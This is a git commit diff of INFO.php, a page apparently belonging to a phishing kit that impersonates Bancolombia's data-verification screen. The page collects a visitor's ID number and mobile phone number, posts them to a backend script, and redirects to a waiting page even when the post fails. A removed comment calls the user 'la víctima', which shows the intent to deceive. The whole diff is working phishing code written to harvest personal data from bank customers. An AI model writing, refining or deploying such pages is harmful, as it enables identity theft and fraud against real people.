d7c575ad2468d78e00ae0c18562ac9f199d0487d
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-22 00:41:24 -0500

    Actualizar INFO.php

--- a/INFO.php
+++ a/INFO.php
@@ -1,6 +1,5 @@
 <?php
-$ip = getenv("REMOTE_ADDR");
-$tiempo = date("l, j \d\e F \d\e Y");
+error_reporting(0);
 date_default_timezone_set('America/Bogota');
 ?>
 <!DOCTYPE html>
@@ -9,113 +8,109 @@ date_default_timezone_set('America/Bogota');
         <title>Bancolombia - Verificación de Datos</title>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-
-        <link rel="preconnect" href="https://fonts.googleapis.com">
-        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
         <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">
-
-        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
         <link href="../css/stylesheet.css" rel="stylesheet">
         <link href="../css/style-app.css?v2" rel="stylesheet">        
-        <link rel="icon" type="image/png" href="../img/logo.png" />
         <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
         <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>
 
         <style type="text/css">
-            /* FIX: display none para que la pantalla cargue visible */
+            /* BLOQUEO CRÍTICO: Forzamos que nazcan ocultos */
             #fondo, #cargando, #cargando-o {
-                display: none;
+                display: none !important;
                 position: fixed;
                 top: 0; left: 0; width: 100%; height: 100%;
-                background: rgba(255,255,255,0.95);
+                background: rgba(255,255,255,0.9);
                 z-index: 9999;
                 text-align: center;
                 padding-top: 50%;
             }
-            .entradas { border: none; outline: none; width: 100%; font-size: 16px; }
-            #btn-info:disabled { background-color: #ccc; cursor: not-allowed; }
-            #btn-info { width: 85%; margin: 20px auto; display: block; height: 48px; border: none; border-radius: 5px; font-weight: bold; }
+            .entradas { border: none; outline: none; width: 100%; font-size: 16px; background: transparent; }
+            .inp { border-bottom: 1px solid #ccc; padding: 10px 0; margin-bottom: 20px; }
+            #btn-info { 
+                width: 90%; margin: 20px auto; display: block; height: 50px; 
+                border: none; border-radius: 25px; font-weight: bold; 
+                background-color: #eee; color: #aaa; transition: 0.3s;
+            }
         </style>
     </head>
     <body>         
         <div id="fondo"></div>
         <div id="cargando-o">
-            <img src="../img/load4.gif" width="90">            
-            <br>Cargando...
+            <img src="../img/load4.gif" width="80"><br>Cargando...
         </div>
 
-        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px;">
+        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 15px;">
             <tr>
-                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
-                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
-                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29"></td>
+                <td align="left"><img src="../img/btn-cerrar.jpg" height="25"></td>
+                <td align="center"><img src="../img/logo-app.jpg" height="25"></td>
+                <td align="right"><span style="color: #ccc;">Continuar</span></td>
             </tr>
         </table>        
         
-        <br><br>
-        <div class="titulo-app" style="text-align: center; font-weight: 800;">Verificación de datos</div>  
-        <div class="descripcion-app" style="text-align: center; padding: 0 20px;">Ingrese sus datos personales para gestionar aprobación</div>  
-        
-        <div class="frm" style="padding: 20px;">
-            <div class="inp" id="inp-documento" style="border-bottom: 1px solid #ccc; padding: 10px 0;">
-                <table width="100%" cellpadding="0" cellspacing="0" border="0">
+        <div style="text-align: center; margin-top: 30px;">
+            <div style="font-weight: 800; font-size: 20px; color: #333;">Verificación de datos</div>
+            <p style="color: #666; font-size: 14px; padding: 0 40px;">Ingrese sus datos personales para gestionar aprobación</p>
+        </div>
+
+        <div class="frm" style="padding: 30px;">
+            <div class="inp">
+                <table width="100%">
                     <tr>
-                        <td valign="middle" width="36" align="left"><img src="../img/ico-id.jpg" width="26"></td>
-                        <td valign="middle" align="left">
-                            <input type="text" id="txt-documento" placeholder="Número de documento" class="entradas" autocomplete="off" inputmode="numeric" maxlength="10">
-                        </td>
+                        <td width="30"><img src="../img/ico-id.jpg" width="20"></td>
+                        <td><input type="text" id="txt-documento" placeholder="Número de documento" class="entradas" inputmode="numeric" maxlength="12"></td>
                     </tr>
                 </table>
             </div>
-            <br>
-            <div class="inp" id="inp-celular" style="border-bottom: 1px solid #ccc; padding: 10px 0;">
-                <table width="100%" cellpadding="0" cellspacing="0" border="0">
+
+            <div class="inp">
+                <table width="100%">
                     <tr>
-                        <td valign="middle" width="36" align="left"><img src="../img/ico-cel.jpg" width="26"></td>
-                        <td valign="middle" align="left">
-                            <input type="text" id="txt-celular" placeholder="Teléfono celular" class="entradas" autocomplete="off" inputmode="numeric" maxlength="10">
-                        </td>
+                        <td width="30"><img src="../img/ico-cel.jpg" width="20"></td>
+                        <td><input type="text" id="txt-celular" placeholder="Teléfono celular" class="entradas" inputmode="numeric" maxlength="10"></td>
                     </tr>
                 </table>
             </div>
         </div>  
 
-        <button class="botones" id="btn-info" disabled>CONTINUAR</button> 
-        <br>
-        <div style="color:#1A1B1A; font-weight: bold; font-size: 14px; text-decoration: underline; text-align: center;">¿No eres cliente?</div>  
+        <button id="btn-info" disabled>CONTINUAR</button> 
+        <p style="text-align: center; color: #1a1b1a; font-weight: bold; text-decoration: underline; font-size: 14px; margin-top: 30px;">¿No eres cliente?</p>
 
         <script type="text/javascript">
             $(document).ready(function() { 
-                // 1. Quitar cualquier bloqueo al cargar
+                // Aseguramos que la pantalla esté limpia al entrar
                 $("#fondo, #cargando-o").hide();
 
-                // 2. Lógica Dinámica: Validar campos en tiempo real
+                // Lógica DINÁMICA para el botón
                 $("#txt-documento, #txt-celular").on("input", function() {
-                    var doc = $("#txt-documento").val();
-                    var cel = $("#txt-celular").val();
+                    var d = $("#txt-documento").val();
+                    var c = $("#txt-celular").val();
 
-                    if (doc.length >= 6 && cel.length === 10) {
-                        $("#btn-info").prop("disabled", false).css({"background-color": "#FDDA24", "color": "#000"});
+                    if (d.length >= 6 && c.length === 10) {
+                        $("#btn-info").prop("disabled", false).css({
+                            "background-color": "#FDDA24",
+                            "color": "#000"
+                        });
                     } else {
-                        $("#btn-info").prop("disabled", true).css("background-color", "#ccc");
+                        $("#btn-info").prop("disabled", true).css({
+                            "background-color": "#eee",
+                            "color": "#aaa"
+                        });
                     }
                 });
 
-                // 3. Envío de datos
+                // Acción de envío a los 2 IDs
                 $("#btn-info").click(function() {
-                    var d = $("#txt-documento").val();
-                    var c = $("#txt-celular").val();
+                    var doc = $("#txt-documento").val();
+                    var cel = $("#txt-celular").val();
                     
                     $("#fondo, #cargando-o").show();
                     
-                    // Enviamos a tu proceso de datos y volvemos al WAITING
-                    $.post("../process/datonuevo.php", { documento: d, celular: c }, function(r) {
+                    // Ajusta el nombre de este proceso según tu servidor (datonuevo.php o proceso.php)
+                    $.post("../process/datonuevo.php", { documento: doc, celular: cel })
+                     .always(function() {
                         window.location.href = "WAITING.php";
-                    }).fail(function() {
-                        // Si falla el archivo, igual saltamos para no trabar la víctima
-                        window.location.href = "WAITING.php";
-                    });
+                     });
                 });
             });
         </script>
